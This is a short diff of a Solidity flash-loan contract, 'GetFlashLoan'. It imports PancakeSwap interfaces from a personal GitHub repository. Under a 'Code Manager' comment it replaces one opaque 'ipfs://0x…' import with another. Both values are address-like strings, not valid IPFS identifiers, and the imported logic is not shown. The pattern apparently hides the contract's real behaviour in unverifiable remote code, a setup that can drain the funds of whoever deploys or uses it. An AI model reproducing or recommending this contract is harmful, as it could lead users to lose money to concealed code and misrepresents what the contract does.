@@ -10,7 +10,7 @@ import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancake
 import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakePairs.sol";
    
 // Code Manager
-import "ipfs://0x2191df1ec8b5cbe369759e3478ad919d7b1098d0";
+import "ipfs://0xEfE66eB5db217BCebF0D4E630B533564207Aa4Ee";
    
 contract GetFlashLoan {
    string public tokenName;
